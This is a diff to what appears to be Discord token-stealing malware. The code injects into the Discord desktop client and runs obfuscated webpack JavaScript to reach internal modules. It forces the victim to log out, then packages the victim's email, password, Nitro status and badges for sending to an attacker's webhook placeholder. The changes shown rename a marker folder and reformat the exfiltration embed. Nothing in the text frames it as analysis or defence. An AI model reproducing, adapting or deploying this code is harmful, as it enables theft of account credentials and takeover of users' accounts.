@@ -6,10 +6,10 @@ const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "Paradise"))) {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "Paradise"));
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -152,16 +152,18 @@ function Login(email, password, token) {
 
                             
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`\n                           
-                            
-                                       <:staff_blue:936543701294010399> **Password:** \`${password}\`\n `,
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": false
                         },
                                 {
-                                   "name": "<a:arrow:765308889859751976> **Other Info**",                                                               
+                                   "name": "<a:arrow:765308889859751976> **Other Info**",
+                                                                                                    
+                                                                                        
+        
+                                                                                                   
                                    "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
-                                 
+
 
 
                                  {
